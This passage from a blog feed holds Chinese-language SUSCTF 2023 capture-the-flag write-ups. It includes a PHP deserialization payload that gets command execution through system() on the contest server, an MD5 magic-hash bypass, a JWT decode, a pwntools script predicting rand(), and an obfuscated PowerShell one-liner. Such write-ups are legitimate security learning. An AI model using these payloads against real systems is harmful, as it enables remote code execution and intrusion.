class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">execSync</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>eval_item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"none\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231013211711836.png\" alt=\"image-20231013211711836\"></p>\n<p><code>susctf&#123;p0llut3_w3ll_78b535fd1d9b&#125;</code></p>\n<h3 id=\"why-not-play-a-game\"><a class=\"markdownIt-Anchor\" href=\"#why-not-play-a-game\">#</a> why not play a game</h3>\n<p>本题直接打开源代码就可以发现 flag</p>\n<p><img data-src=\"image-20231014144424179.png\" alt=\"image-20231014144424179\"></p>\n<p><code>susctf&#123;welcome_to_susctf_2023_ctf_is_so_fun&#125;</code></p>\n<h3 id=\"转瞬即逝\"><a class=\"markdownIt-Anchor\" href=\"#转瞬即逝\">#</a> 转瞬即逝</h3>\n<p>提示如下：</p>\n<p>即时间和密码的差值小于 5 时才可以通过验证</p>\n<pre><code> &lt;!-- maybe... int(time.time()) - int(password) &lt; 5 --&gt;\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWF0b29scy5jb20vdGltZXN0YW1w\">在线获取时间戳</span>，并根据手速进行略微修正自己的密码，登陆后页面转瞬即逝，所以采用抓包进行查看，得到如下内容：</p>\n<p><img data-src=\"image-20231014200809419.png\" alt=\"image-20231014200809419\"></p>\n<p>显然是一个加密，直接丢入 cyberchef 进行 magic 即可</p>\n<pre><code>eyJhbGciOiJIUzI1NiJ9.eyJnaWZ0Ijoic3VzY3Rme1lvdXJfR2kxVF9PZl9NT01FbnRfNmY4ZTFiMTk0YjE2fSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.OA-iCBGh33axSvXRCc0YBlQjxse_JIAENxn-qropZOM\n</code></pre>\n<p><img data-src=\"image-20231014200934693.png\" alt=\"image-20231014200934693\"></p>\n<p><code>susctf&#123;Your_Gi1T_Of_MOMEnt_6f8e1b194b16&#125;</code></p>\n<h3 id=\"sleep-away\"><a class=\"markdownIt-Anchor\" href=\"#sleep-away\">#</a> sleep away</h3>\n<p>第一步 md5 绕过，只要是科学计数法即可：</p>\n<pre><code>http://game.ctf.seusus.com:40044/?step1=0e215962017\n</code></pre>\n<p>第二步构造反序列化 1.php：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">safeeval</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$evalstr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$args_down</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls la /\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">evalstr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">helper</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$youneed</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$truearg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$thinkit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$you</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$think</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">thinkit</span><span class=\"token operator\">=</span><span class=\"token variable\">$think</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span><span class=\"token operator\">=</span><span class=\"token variable\">$you</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">truearg</span><span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"wakeup\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">turearg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">safeeval</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>运行：</p>\n<pre><code>php -f 1.php   # ---&gt; O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;s:7:&quot;ls la /&quot;;&#125;\n</code></pre>\n<pre><code>http://game.ctf.seusus.com:24076/?step1=0e215962017&amp;backdoor=O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;s:7:&quot;ls la /&quot;;&#125;\n</code></pre>\n<p>直接注入的话 args_down 会被 wake_up 函数直接置为空：</p>\n<p><img data-src=\"image-20231015104120912.png\" alt=\"image-20231015104120912\"></p>\n<p>如果更改 safeeval 元素超过 2 个的话则会没有任何反应。</p>\n<p><img data-src=\"image-20231015103956847.png\" alt=\"image-20231015103956847\"></p>\n<p>利用 class helper，进行构建，将 youneed 和 args_down 进行内存地址链接。使得 wake_up 时先执行 safeeval 的 wake_up，将 arg 置为空后，再执行 helper 的 wake_up，对 youneed 进行赋值，args_down 的值也会随之改变。</p>\n<p>代码和结果如下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">safeeval</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$evalstr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$args_down</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls la /\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">evalstr</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$evalstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">helper</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$youneed</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$turearg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$thinkit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"wakeup\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">turearg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">safeeval</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$he</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$he</span><span class=\"token operator\">-></span><span class=\"token property\">youneed</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$test</span><span class=\"token operator\">-></span><span class=\"token property\">args_down</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$he</span><span class=\"token operator\">-></span><span class=\"token property\">thinkit</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$he</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>O:6:&quot;helper&quot;:3:&#123;s:7:&quot;youneed&quot;;s:7:&quot;ls la /&quot;;s:7:&quot;turearg&quot;;s:2:&quot;ls&quot;;s:7:&quot;thinkit&quot;;O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;R:2;&#125;&#125;\n</code></pre>\n<pre><code>http://game.ctf.seusus.com:24076/?step1=0e215962017&amp;backdoor=O:6:&quot;helper&quot;:3:&#123;s:7:&quot;youneed&quot;;s:7:&quot;ls la /&quot;;s:7:&quot;turearg&quot;;s:2:&quot;ls&quot;;s:7:&quot;thinkit&quot;;O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;R:2;&#125;&#125;\n</code></pre>\n<p>得到如下内容：</p>\n<p><img data-src=\"image-20231015113032096.png\" alt=\"image-20231015113032096\"></p>\n<p><img data-src=\"image-20231015113133080.png\" alt=\"image-20231015113133080\"></p>\n<p>修改为 cat /f1agggg：</p>\n<pre><code>O:6:&quot;helper&quot;:3:&#123;s:7:&quot;youneed&quot;;s:7:&quot;ls la /&quot;;s:7:&quot;turearg&quot;;s:12:&quot;cat /f1agggg&quot;;s:7:&quot;thinkit&quot;;O:8:&quot;safeeval&quot;:2:&#123;s:7:&quot;evalstr&quot;;s:6:&quot;system&quot;;s:9:&quot;args_down&quot;;R:2;&#125;&#125;\n</code></pre>\n<p><img data-src=\"image-20231015113217333.png\" alt=\"image-20231015113217333\"></p>\n<p>拿到 flag： <code>susctf&#123;R_1s_g00d_e1a2b8682df9&#125;</code></p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h2>\n<h3 id=\"random\"><a class=\"markdownIt-Anchor\" href=\"#random\">#</a> random</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lfcGVhay9hcnRpY2xlL2RldGFpbHMvMTEzODQ0NTA5\">参考学习</span></p>\n<p>异或操作一个数，再异或该数就可以得到它本身。</p>\n<p><img data-src=\"image-20231014202334171.png\" alt=\"image-20231014202334171\"></p>\n<p><img data-src=\"image-20231014205053925.png\" alt=\"image-20231014205053925\"></p>\n<p>代码如下所示，先在本地得到一个随机数，将其与 -889275714 进行异或操作就可以得到 key 的值，随后利用该 key 链接远程环境进行攻击。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dll <span class=\"token operator\">=</span> CDLL<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># sh = process('/mnt/e/ramDownload/random')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"game.ctf.seusus.com\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">36349</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dll<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dll<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> <span class=\"token number\">1804289383</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>v <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">889275714</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>key <span class=\"token operator\">=</span> r <span class=\"token operator\">^</span> v</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(key) #-1586102311</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'mind?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1586102311</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在远程环境下运行，得到 flag：</p>\n<p><img data-src=\"image-20231014204746771.png\" alt=\"image-20231014204746771\"></p>\n<p><code>susctf&#123;ju57_p5euD0-raNDoM_8441355483d1&#125;</code></p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h2>\n<h3 id=\"signin\"><a class=\"markdownIt-Anchor\" href=\"#signin\">#</a> signin</h3>\n<p>掏出 DIE：</p>\n<p><img data-src=\"image-20231014205220789.png\" alt=\"image-20231014205220789\"></p>\n<p>好了，可以丢进 IDA 了：</p>\n<p><img data-src=\"image-20231014210556913.png\" alt=\"image-20231014210556913\"></p>\n<p>读进去的数进行一系列操作后和 unk_41F000 进行比较，我们只需要将这个一系列过程反过来进行执行，通过 unk_41F000 得到我们需要输入的数：</p>\n<p><img data-src=\"image-20231014210541108.png\" alt=\"image-20231014210541108\"></p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>unk_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X59</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X39</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X42</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X26</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6B</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X45</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X31</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X44</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X4C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X68</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X2D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X5F</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6E</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X2D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X6A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X49</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X5A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0X75</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    v6 <span class=\"token operator\">=</span> unk_<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    unk_<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> unk_<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    unk_<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v6</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    unk_<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span><span class=\"token operator\">=</span> unk_<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>unk_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>chars <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> unk_<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行结果如下：</p>\n<p><img data-src=\"image-20231014214422191.png\" alt=\"image-20231014214422191\"></p>\n<p><code>susctf&#123;6r347_7h15_15_4n_345y_r3_f0r_y0u&#125;</code></p>\n<h3 id=\"babypowershell\"><a class=\"markdownIt-Anchor\" href=\"#babypowershell\">#</a> babyPowerShell</h3>\n<p>题目如下所示：</p>\n<pre><code>('w'+(&quot;&#123;0&#125;&#123;1&#125;&quot; -f 'yes','us')+'c'+'tf'+'&#123;Pow'+(&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot; -f'shel','er','l')+'_'+'i'+(&quot;&#123;0&#125;&#123;1&#125;&quot;-f'sss','s')+'ss'+(&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot; -f 's','sss_v','ss')+(&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;-f '_ez_f','err','y')+'o'+'rrr'+'r'+'rr'+'r'+'r_you&#125;'+(&quot;&#123;1&#125;&#123;0&#125;&quot; -f 'zZRout','wye')+(&quot;&#123;0&#125;&#123;1&#125;&quot;-f'-nul','l')).REPLAce('zZR',[StRing][CHAR]124).REPLAce(([CHAR]119+[CHAR]121+[CHAR]101),[StRing][CHAR]34)|.( $EnV:COMsPEC[4,26,25]-JoiN'')\n</code></pre>\n<p>该命令等价于：</p>\n<p><img data-src=\"image-20231015172532919.png\" alt=\"image-20231015172532919\"></p>\n<p>因此 flag 为： <code>susctf&#123;Powershell_issssssssssss_verry_ez_forrrrrrrr_you&#125;</code></p>\n",
            "tags": [
                "SUSCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/15/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20Crypto%20Week2/",
            "url": "http://yanagi-kon.github.io/2023/10/15/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20Crypto%20Week2/",
            "title": "NewStarCTF 2023 公开赛道 Week2",
            "date_published": "2023-10-15T09:06:00.000Z",
